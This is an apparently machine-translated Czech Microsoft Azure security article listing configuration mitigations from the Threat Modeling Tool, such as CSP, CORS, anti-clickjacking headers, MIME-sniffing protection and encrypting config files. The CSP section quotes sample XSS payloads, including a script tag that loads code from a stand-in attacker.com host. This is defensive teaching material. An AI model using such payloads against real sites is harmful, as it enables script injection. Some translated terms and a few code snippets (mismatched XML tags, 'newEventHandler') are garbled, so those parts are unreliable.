---
title: Správa konfigurace pro Microsoft Threat Modeling Tool
titleSuffix: Azure
description: Přečtěte si o správě konfigurace pro Threat Modeling Tool. Podívejte se na informace o zmírnění rizik a zobrazte příklady kódu.
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.custom: devx-track-js, devx-track-csharp
ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
ms.sourcegitcommit: 867cb1b7a1f3a1f0b427282c648d411d0ca4f81f
ms.translationtype: MT
ms.contentlocale: cs-CZ
ms.lasthandoff: 03/19/2021
ms.locfileid: "94517480"
---
# <a name="security-frame-configuration-management--mitigations"></a>Rámec zabezpečení: Správa konfigurace | Hrozeb 
| Produkt/služba | Článek |
| --------------- | ------- |
| **Webová aplikace** | <ul><li>[Implementace zásad zabezpečení obsahu (CSP) a zakázání vloženého JavaScriptu](#csp-js)</li><li>[Povolit filtr skriptování XSS v prohlížeči](#xss-filter)</li><li>[Aplikace ASP.NET musí před nasazením zakázat trasování a ladění.](#trace-deploy)</li><li>[Přístup k javascriptům třetích stran jenom z důvěryhodných zdrojů](#js-trusted)</li><li>[Zajistěte, aby ověřené stránky ASP.NET zahrnovaly přeopravení uživatelského rozhraní nebo obrany při kliknutí na zdířky.](#ui-defenses)</li><li>[Zajistěte, aby byly povoleny pouze důvěryhodné zdroje, pokud je v ASP.NET webových aplikacích povoleno CORS.](#cors-aspnet)</li><li>[Povolit atribut ValidateRequest na stránkách ASP.NET](#validate-aspnet)</li><li>[Používat místně hostované nejnovější verze knihoven JavaScript](#local-js)</li><li>[Zakázat automatické sledování dat v kódování MIME](#mime-sniff)</li><li>[Odebrání standardních hlaviček serveru na webech Windows Azure, aby nedocházelo k otiskům prstů](#standard-finger)</li></ul> |
| **Databáze** | <ul><li>[Konfigurace brány Windows Firewall pro přístup k databázovému stroji](#firewall-db)</li></ul> |
| **Webové rozhraní API** | <ul><li>[Ujistěte se, že je povolený jenom důvěryhodný původ, pokud je v rozhraní Web API pro ASP.NET povolené CORS.](#cors-api)</li><li>[Šifrovat oddíly konfiguračních souborů webového rozhraní API, které obsahují citlivá data](#config-sensitive)</li></ul> |
| **Zařízení IoT** | <ul><li>[Ujistěte se, že všechna rozhraní správce jsou zabezpečená pomocí silných přihlašovacích údajů.](#admin-strong)</li><li>[Zajistěte, aby na zařízeních nebyl spuštěn neznámý kód.](#unknown-exe)</li><li>[Zašifrujte operační systém a další oddíly zařízení IoT pomocí bitových zámků.](#partition-iot)</li><li>[Zajistěte, aby na zařízeních byly povolené jenom minimální služby a funkce.](#min-enable)</li></ul> |
| **Brána pole IoT** | <ul><li>[Zašifrujte operační systém a další oddíly brány pole IoT pomocí bitových zámků.](#field-bit-locker)</li><li>[Ujistěte se, že výchozí přihlašovací údaje brány pole jsou během instalace změněny.](#default-change)</li></ul> |
| **Cloudová brána IoT** | <ul><li>[Zajistěte, aby cloudová brána implementovala proces, který zachová firmware připojených zařízení v aktuálním stavu.](#cloud-firmware)</li></ul> |
| **Hranice důvěryhodnosti počítače** | <ul><li>[Ujistěte se, že zařízení mají ovládací prvky zabezpečení koncového bodu nakonfigurované podle zásad pro organizace.](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zajistěte zabezpečenou správu přístupových klíčů Azure Storage.](#secure-keys)</li><li>[Ujistěte se, že je povolený jenom důvěryhodný původ, pokud je v Azure Storage povolené CORS.](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Povolit funkci omezování služby WCF](#throttling)</li><li>[WCF – zpřístupnění informací prostřednictvím metadat](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementace zásad zabezpečení obsahu (CSP) a zakázání vloženého JavaScriptu

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [Informace o zásadách zabezpečení obsahu](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [referenčních informací o zásadách zabezpečení](https://content-security-policy.com/)obsahu, [funkcích zabezpečení](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Úvod k zásadám zabezpečení obsahu](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), můžu [použít CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Kroky** | <p>Zásady zabezpečení obsahu (CSP) jsou bezpečnostní mechanizmus, který je ve formátu W3C Standard, který umožňuje vlastníkům webových aplikací řídit obsah vložený na jejich webu. CSP se přidá jako hlavička HTTP odpovědi na webovém serveru a na straně klienta se vynutilo pomocí prohlížečů. Jedná se o povolené zásady založené na seznamu – web může deklarovat sadu důvěryhodných domén, ze kterých se dá načíst aktivní obsah, jako je JavaScript.</p><p>CSP přináší následující výhody zabezpečení:</p><ul><li>**Ochrana proti XSS:** Pokud je stránka pro skriptování XSS zranitelná, útočník ji může zneužít dvěma způsoby:<ul><li>Vložit `<script>malicious code</script>` . Tato zneužití nebudou fungovat v důsledku základního omezení CSP – 1.</li><li>Vložit `<script src="http://attacker.com/maliciousCode.js"/>` . Toto zneužití nebude fungovat, protože doména řízená útočníkem nebude v seznamu povolených domén CSP.</li></ul></li><li>**Kontrola nad exfiltrace dat:** Pokud se nějaký škodlivý obsah na webové stránce pokusí připojit k externímu webu a ukrást data, připojení pomocí CSP bude přerušeno. Důvodem je to, že cílová doména nebude v seznamu povolených CSP.</li><li>**Obrana proti kliknutí na zdířky:** kliknutí na zdířku je technika útoku, pomocí které nežádoucí osoba může orámovat originální web a přinutit uživatele, aby na prvky uživatelského rozhraní klikní. V současné době se ochrana proti kliknutí na konektory dosahuje konfigurací odpovědí-X-frame-Options. Ne všechny prohlížeče respektují tuto hlavičku a přenášející se poskytovatel CSP bude standardní způsob, jak se chránit před kliknutím na zásuvku</li><li>**Vytváření sestav útoku v reálném čase:** Pokud dojde k útoku na vložení na webu s povoleným CSP, prohlížeče automaticky aktivují oznámení na koncový bod nakonfigurovaný na webovém serveru. Tímto způsobem CSP slouží jako výstražný systém v reálném čase.</li></ul> |

### <a name="example"></a>Příklad
Příklad zásady: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Tato zásada umožňuje skriptům načíst pouze ze serveru webové aplikace a serveru Google Analytics. Skripty načtené z jakékoli jiné lokality budou odmítnuty. Když je na webu povolený CSP, automaticky se zablokují následující funkce pro zmírnění útoků XSS. 

### <a name="example"></a>Příklad
Vložené skripty se nespustí. Následují příklady vložených skriptů. 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Příklad
Řetězce nebudou vyhodnoceny jako kód. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Povolit filtr skriptování XSS v prohlížeči

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [Filtr ochrany XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Kroky** | <p>Konfigurace záhlaví odpovědi X-XSS-Protection řídí filtr skriptu pro křížové stránky v prohlížeči. Tato hlavička odpovědi může obsahovat následující hodnoty:</p><ul><li>`0:` Tím se filtr zakáže.</li><li>`1: Filter enabled` Pokud se zjistí útok na skriptování mezi weby, aby se útok zastavil, prohlížeč stránku upraví.</li><li>`1: mode=block : Filter enabled`. Místo upravování stránky, když se zjistí Útok XSS, prohlížeč znemožní vykreslování stránky.</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Prohlížeč upraví stránku a nahlásí porušení.</li></ul><p>Toto je funkce Chromu, která pomocí sestav porušení CSP pošle podrobnosti identifikátoru URI dle vašeho výběru. Poslední 2 možnosti jsou považovány za bezpečné hodnoty.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>Aplikace ASP.NET musí před nasazením zakázat trasování a ladění.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [Přehled ladění ASP.NET](/previous-versions/ms227556(v=vs.140)), [Přehled trasování ASP.NET](/previous-versions/bb386420(v=vs.140)), [Postupy: povolení trasování pro aplikaci pro ASP.NET](/previous-versions/0x5wc973(v=vs.140)), [Postupy: povolení ladění pro aplikace ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Kroky** | Pokud je pro stránku povoleno trasování, každý prohlížeč, který ho požaduje, získá také informace o trasování obsahující data o interním stavu serveru a pracovním postupu. Tyto informace mohou být citlivé na zabezpečení. Když je ladění povoleno pro stránku, chyby, které se vyskytnou na serveru, budou mít za následek kompletní data trasování zásobníku uvedená v prohlížeči. Tato data můžou vystavovat informace citlivé na zabezpečení pro pracovní postup serveru. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Přístup k javascriptům třetích stran jenom z důvěryhodných zdrojů

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | JavaScripty třetích stran by měly být odkazovány pouze z důvěryhodných zdrojů. Koncové body odkazu by měly vždy být v TLS. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Zajistěte, aby ověřené stránky ASP.NET zahrnovaly přeopravení uživatelského rozhraní nebo obrany při kliknutí na zdířky.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [OWASP kliknutí na tahák pro ochranu pomocí konektorů](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [interní funkce IE – boj po kliknutí s X-frame-Options](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
| **Kroky** | <p>kliknutí na zdířky, označované také jako "útok na nápravu uživatelského rozhraní", je v případě, že útočník využije více průhledných nebo neprůhledných vrstev a získá uživateli možnost kliknout na tlačítko nebo odkaz na jinou stránku, pokud se na stránku na nejvyšší úrovni nechce kliknout.</p><p>Tato vrstva se dosahuje vytvořením škodlivé stránky s elementem IFRAME, který načte stránku oběti. Útočník proto má "zneužití", které je určeno pro svou stránku a jejich směrování na jinou stránku, která je pravděpodobně vlastněná jinou aplikací, doménou nebo obojím. Pokud chcete zabránit útokům na zdířky, nastavte správné hlavičky odpovědí protokolu HTTP na základě snímků, které prohlížeči přidávají pokyny, aby nepovolovaly rámce z jiných domén.</p>|

### <a name="example"></a>Příklad
Záhlaví možností X-rámec lze nastavit prostřednictvím služby IIS web.config. Web.config fragment kódu pro lokality, které by nikdy neměly být orámovány: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Příklad
Web.config kód pro lokality, které by měly být pouze orámovány stránkami ve stejné doméně: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Zajistěte, aby byly povoleny pouze důvěryhodné zdroje, pokud je v ASP.NET webových aplikacích povoleno CORS.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Webové formuláře, MVC5 |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásady stejného původu a brání škodlivému webu v čtení citlivých dat z jiné lokality. V některých případech ale může být nutné vystavit rozhraní API bezpečně, které ostatní weby mohou spotřebovat. Sdílení prostředků mezi zdroji (CORS) je standard W3C, který umožňuje serveru zmírnit zásady stejného zdroje. Při použití CORS může server explicitně umožnit některé žádosti o více zdrojů a současně odmítat jiné.</p><p>CORS je bezpečnější a pružnější než u předchozích technik, jako je JSONP. V takovém případě umožňuje překlad CORS přidat k webové aplikaci několik hlaviček HTTP odpovědi (Access-Control-*) a můžete to udělat několika způsoby.</p>|

### <a name="example"></a>Příklad
Pokud je k dispozici přístup k Web.config, můžete CORS přidat pomocí následujícího kódu: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Příklad
Pokud přístup k web.config není k dispozici, je možné konfigurovat CORS přidáním následujícího kódu CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Upozorňujeme, že je důležité zajistit, aby byl seznam původních prvků v atributu Access-Control-Allow-Origin nastaven na konečnou a důvěryhodnou sadu zdrojů. Nepatřičná konfigurace (např. nastavení hodnoty *) umožní škodlivým webům aktivovat požadavky mezi zdroji na webovou aplikaci >bez jakýchkoli omezení, takže aplikace bude zranitelná proti útokům CSRF. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Povolit atribut ValidateRequest na stránkách ASP.NET

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Webové formuláře, MVC5 |
| **Atributy**              | –  |
| **Reference**              | [Ověření požadavku – obrana před skriptovými útoky](https://www.asp.net/whitepapers/request-validation) |
| **Kroky** | <p>Žádost o ověření, funkce ASP.NET od verze 1,1, brání serveru v přijetí obsahu obsahujícího nešifrovaný kód HTML. Tato funkce je navržená tak, aby zabránila útokům prostřednictvím injektáže skriptu, přičemž kód skriptu nebo HTML může být nevědomě odeslán na server, uložený a následně prezentovan jiným uživatelům. I když je to vhodné, důrazně doporučujeme ověřit všechna vstupní data a kódování HTML.</p><p>Ověření žádosti se provádí porovnáním všech vstupních dat se seznamem potenciálně nebezpečných hodnot. Pokud dojde ke shodě, ASP.NET vyvolá `HttpRequestValidationException` . Ve výchozím nastavení je funkce ověřování žádostí povolena.</p>|

### <a name="example"></a>Příklad
Tuto funkci je však možné zakázat na úrovni stránky: 
```XML
<%@ Page validateRequest="false" %> 
```
nebo, na úrovni aplikace 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Upozorňujeme, že funkce ověření žádosti není podporovaná a není součástí MVC6 kanálu. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Používat místně hostované nejnovější verze knihoven JavaScript

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | <p>Vývojáři, kteří používají standardní knihovny jazyka JavaScript, jako je JQuery, musí používat schválené verze běžných knihoven JavaScriptu, které neobsahují známé chyby zabezpečení. Dobrým postupem je použít nejnovější verzi knihoven, protože obsahují opravy zabezpečení pro známé chyby zabezpečení ve starších verzích.</p><p>Pokud poslední vydání nelze použít z důvodů kompatibility, je třeba použít níže uvedené minimální verze.</p><p>Přijatelné minimální verze:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1,9</li><li>JQuery Mobile 1.0.1</li><li>Cyklus JQuery 2,99</li><li>1.9.0y JQuery DataTables</li></ul></li><li>**Ajax Control Toolkit**<ul><li>AJAX Control Toolkit 40412</li></ul></li><li>**Webové formuláře a AJAX pro ASP.NET**<ul><li>Webové formuláře ASP.NET a Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Nikdy nečítat žádné knihovny JavaScriptu z externích webů, jako je například Public sítě CDN</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Zakázat automatické sledování dat v kódování MIME

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [IE8 Security Part V: komplexní ochrana](/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [typ MIME](https://en.wikipedia.org/wiki/Mime_type) |
| **Kroky** | Hlavička X-Content-Type-Options je hlavička protokolu HTTP, která vývojářům umožňuje určit, že jejich obsah by neměl být ve formátu MIME. Tato hlavička je navržená tak, aby zmírnila MIME-Sniffing útoky. Pro každou stránku, která by mohla obsahovat uživatelsky ovladatelné obsahy, je nutné použít záhlaví HTTP X-Content-Type-Options: insniffer. Pokud chcete povinnou hlavičku globálně povolit pro všechny stránky v aplikaci, můžete provést jednu z následujících akcí:|

### <a name="example"></a>Příklad
Pokud je aplikace hostovaná pomocí Internetová informační služba (IIS) 7 a vyšší, přidejte do souboru web.config hlavičku. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Příklad
Přidat hlavičku do globální aplikace \_ beginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Příklad
Implementace vlastního modulu HTTP 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Příklad
Požadovanou hlavičku můžete povolit jenom pro konkrétní stránky tak, že ji přidáte do jednotlivých odpovědí: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Odebrání standardních hlaviček serveru na webech Windows Azure, aby nedocházelo k otiskům prstů

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | EnvironmentType – Azure |
| **Reference**              | [Odebrání standardních hlaviček serveru na webech Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Kroky** | Hlavičky, jako je server, X-s, x-AspNet-Version, odhalují informace o serveru a základních technologiích. Doporučuje se potlačit tato záhlaví a zabránit tak otisku prstu aplikace. |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Konfigurace brány Windows Firewall pro přístup k databázovému stroji

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | databáze | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | SQL Azure, OnPrem |
| **Atributy**              | N/A, verze SQL – V12 |
| **Reference**              | [Jak nakonfigurovat bránu Azure SQL Database firewall](../../azure-sql/database/firewall-configure.md), [nakonfigurovat bránu Windows Firewall pro přístup k databázovému stroji](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
| **Kroky** | Firewallové systémy zabraňují neoprávněnému přístupu k počítačovým prostředkům. Pokud chcete získat přístup k instanci databázového stroje SQL Server přes bránu firewall, musíte bránu firewall nakonfigurovat na počítači, na kterém běží SQL Server, aby se povolil přístup. |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Ujistěte se, že je povolený jenom důvěryhodný původ, pokud je v rozhraní Web API pro ASP.NET povolené CORS.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webové rozhraní API | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | MVC 5 |
| **Atributy**              | –  |
| **Reference**              | [Povolení žádostí o více zdrojů v ASP.NET webovém rozhraní API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API – CORS podpora v ASP.NET webovém rozhraní API 2](/archive/msdn-magazine/2013/december/asp-net-web-api-cors-support-in-asp-net-web-api-2) |
| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásady stejného původu a brání škodlivému webu v čtení citlivých dat z jiné lokality. V některých případech ale může být nutné vystavit rozhraní API bezpečně, které ostatní weby mohou spotřebovat. Sdílení prostředků mezi zdroji (CORS) je standard W3C, který umožňuje serveru zmírnit zásady stejného zdroje.</p><p>Při použití CORS může server explicitně umožnit některé žádosti o více zdrojů a současně odmítat jiné. CORS je bezpečnější a pružnější než u předchozích technik, jako je JSONP.</p>|

### <a name="example"></a>Příklad
Do App_Start/WebApiConfig.cs přidejte následující kód do metody WebApiConfig. Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Příklad
Atribut EnableCors lze použít na metody akcí v řadiči následujícím způsobem: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Všimněte si, že je důležité zajistit, aby byl seznam původcích v atributu EnableCors nastaven na konečnou a důvěryhodnou sadu zdrojů. Nepatřičná konfigurace (např. nastavení hodnoty *) umožní škodlivým webům aktivovat požadavky mezi zdroji na rozhraní API bez jakýchkoli omezení, >tak, aby rozhraní API mohlo být zranitelné vůči útokům CSRF. EnableCors je možné dekorovat na úrovni řadiče. 

### <a name="example"></a>Příklad
Chcete-li zakázat CORS pro konkrétní metodu ve třídě, lze použít atribut DisableCors, jak je znázorněno níže: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webové rozhraní API | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | MVC 6 |
| **Atributy**              | –  |
| **Reference**              | [Povolení žádostí mezi zdroji (CORS) v ASP.NET Core 1,0](https://docs.asp.net/en/latest/security/cors.html) |
| **Kroky** | <p>V ASP.NET Core 1,0 lze CORS povolit buď pomocí middlewaru, nebo pomocí MVC. Při použití MVC k povolení CORS se používají stejné služby CORS, ale middleware CORS není.</p>|

**Přístup – 1** Povolení CORS s middlewarem: Pokud chcete povolit CORS pro celou aplikaci, přidejte do kanálu požadavků middleware CORS pomocí metody rozšíření UseCors. Pokud přidáte middleware CORS pomocí třídy CorsPolicyBuilder, můžete zadat zásady pro více zdrojů. Toto lze provést dvěma způsoby:

### <a name="example"></a>Příklad
První je volat UseCors pomocí lambda. Lambda převezme objekt CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Příklad
Druhým je definovat jednu nebo více pojmenovaných zásad CORS a pak vybrat zásadu podle názvu v době běhu. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Přístup 2** Povolení CORS v MVC: vývojáři můžou alternativně použít MVC k aplikování konkrétní CORS na akci, na kontroler nebo globálně pro všechny řadiče.

### <a name="example"></a>Příklad
Na akci: Chcete-li zadat zásadu CORS pro konkrétní akci, přidejte k akci atribut [EnableCors]. Zadejte název zásady. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Příklad
Na jeden kontroler: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Příklad
Univerzál 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Všimněte si, že je důležité zajistit, aby byl seznam původcích v atributu EnableCors nastaven na konečnou a důvěryhodnou sadu zdrojů. Nepatřičná konfigurace (např. nastavení hodnoty *) umožní škodlivým webům aktivovat požadavky mezi zdroji na rozhraní API bez jakýchkoli omezení, >tak, aby rozhraní API mohlo být zranitelné vůči útokům CSRF. 

### <a name="example"></a>Příklad
Chcete-li zakázat CORS pro kontroler nebo akci, použijte atribut [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Šifrovat oddíly konfiguračních souborů webového rozhraní API, které obsahují citlivá data

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webové rozhraní API | 
| **Fáze SDL**               | Nasazení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [Postupy: šifrování konfiguračních oddílů v ASP.NET 2,0 pomocí DPAPI](/previous-versions/msp-n-p/ff647398(v=pandp.10)), [určení poskytovatele chráněné konfigurace](/previous-versions/68ze1hb2(v=vs.140)) [pomocí Azure Key Vault k ochraně tajných klíčů aplikací](/azure/architecture/multitenant-identity/web-api) |
| **Kroky** | Konfigurační soubory, například Web.config, appsettings.jsna se často používají k ukládání citlivých informací, včetně uživatelských jmen, hesel, připojovacích řetězců databáze a šifrovacích klíčů. Pokud tyto informace nechráníte, je vaše aplikace zranitelná vůči útočníkům nebo zlomyslným uživatelům, kteří získají citlivé informace, jako jsou uživatelská jména a hesla pro účty, názvy databází a názvy serverů. V závislosti na typu nasazení (Azure/on-Prem) Šifrujte citlivé oddíly konfiguračních souborů pomocí DPAPI nebo služeb, jako je Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Ujistěte se, že všechna rozhraní správce jsou zabezpečená pomocí silných přihlašovacích údajů.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **Fáze SDL**               | Nasazení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | Všechna rozhraní pro správu, která zpřístupňuje brána zařízení nebo pole, by měla být zabezpečená pomocí silných přihlašovacích údajů. Všechna další vystavená rozhraní, jako je Wi-Fi, SSH, sdílené složky, by měla být zabezpečená pomocí silných přihlašovacích údajů. Výchozí slabá hesla by se neměla používat. |

